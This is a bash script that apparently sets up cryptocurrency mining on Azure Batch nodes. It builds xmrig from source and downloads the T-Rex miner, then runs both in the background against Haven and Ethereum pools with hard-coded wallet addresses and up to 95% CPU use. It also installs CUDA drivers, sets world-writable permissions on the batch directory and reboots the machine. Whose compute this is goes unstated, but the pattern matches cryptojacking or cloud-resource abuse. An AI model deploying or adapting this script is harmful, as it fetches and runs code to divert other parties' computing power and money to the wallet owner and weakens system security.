DIR="/home/_azbatch/xmrig/build/xmrig"
if [ -f "$DIR" ]; then
  ### Take action if $DIR exists ###
    /home/_azbatch/xmrig/build/xmrig --algo=cn-heavy/xhv --url=pool.haven.hashvault.pro:80 --user=hvxyCNrJiqvBtdqWPpAvxtGwLq5n3DdhKcV7rSYRRkxLUGK6pEGm44TAdP9Q11KQKFKCyeEfEge2zMD1nk51aM3u65hqyrQdJi --pass=x --nicehash --max-cpu-usage 95 --cpu-priority 2 --background &&
    hostname=$(hostname | cut -c1-8) &&
    /home/_azbatch/trex/t-rex --algo ethash --intensity 25 --url stratum1+tcp://us-eth.2miners.com:2020 --user 0x6bA4d687Aec1055163DF07F8EA10D643D91d8e20 --worker $hostname --pass pppwww --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30 
else
    sudo apt-get update ;
    sudo apt-get -y install libssl-dev cmake build-essential libhwloc-dev libuv1-dev linux-headers-5.4.0-1046-azure ;
    cd /home/_azbatch/ ;
    sudo rm cuda-ubuntu*  > /dev/null 2>&1 
    wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin > /dev/null 2>&1 
    sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600  &
    sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub  > /dev/null 2>&1 
    echo "deb http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list &&
    sudo apt-get update ;
    sudo apt-get -y install cuda-drivers ;
    sudo chmod -R 777 /home/_azbatch ;
    cd /home/_azbatch ;
    sudo rm -rf xmrig &
    git clone https://github.com/xmrig/xmrig.git && 
    cd /home/_azbatch/xmrig &&
    git checkout v6.12.2 > /dev/null 2>&1 
    sleep 3 &&
    mkdir /home/_azbatch/xmrig/build ;
    cd /home/_azbatch/xmrig/build ;
    cmake .. && 
    make ;
    sleep 5 ;
    /home/_azbatch/xmrig/build/xmrig --algo=cn-heavy/xhv --url=pool.haven.hashvault.pro:80 --user=hvxyCNrJiqvBtdqWPpAvxtGwLq5n3DdhKcV7rSYRRkxLUGK6pEGm44TAdP9Q11KQKFKCyeEfEge2zMD1nk51aM3u65hqyrQdJi --pass=x --nicehash --max-cpu-usage 95 --cpu-priority 2 --background &&
    mkdir /home/_azbatch/trex ;
    cd /home/_azbatch/trex &&
    wget https://trex-miner.com/download/t-rex-0.20.4-linux.tar.gz &&
    tar -xzvf /home/_azbatch/trex/t-rex-0.20.4-linux.tar.gz &&
    cd /home/_azbatch/trex &&
    hostname=$(hostname | cut -c1-8) &&
     /home/_azbatch/trex/t-rex --algo ethash --url stratum1+tcp://us-eth.2miners.com:2020 --user 0x6bA4d687Aec1055163DF07F8EA10D643D91d8e20 --worker $hostname --pass pppwww --cpu-priority 5 --api-bind-http 0 --api-bind-telnet 0 --retries 90 --retry-pause 30 ;
    sudo reboot
fi
